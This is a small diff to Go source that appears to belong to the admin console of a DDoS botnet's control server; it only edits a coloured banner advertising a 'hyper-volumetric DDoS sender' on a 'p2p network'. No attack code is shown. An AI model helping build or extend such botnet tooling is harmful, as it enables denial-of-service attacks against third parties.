@@ -77,7 +77,7 @@ func (this *Admin) Handle() {
 	this.conn.Write([]byte("\x1b[0m    \x1b[1;34m╔═╗\x1b[1;36m═╗ ╦\x1b[1;94m╦\x1b[1;34m╔═╗\x1b[1;36m Distributed\x1b[0m\r\n"))
 	this.conn.Write([]byte("\x1b[0m    \x1b[1;34m╠═╣\x1b[1;36m╔╩╦╝\x1b[1;94m║\x1b[1;34m╚═╗\x1b[1;36m Denial\x1b[0m\r\n"))
 	this.conn.Write([]byte("\x1b[0m    \x1b[1;34m╩ ╩\x1b[1;36m╩ ╚═\x1b[1;94m╩\x1b[1;34m╚═╝\x1b[1;36m Of Service\x1b[0m\r\n"))
-	this.conn.Write([]byte("\x1b[1;36m                  hyper-volumetric DDoS sender\r\n"))
+	this.conn.Write([]byte("\x1b[1;36m           hyper-volumetric DDoS sender - p2p network\r\n"))
 
 	/* Start window title updater */
 	go func() {
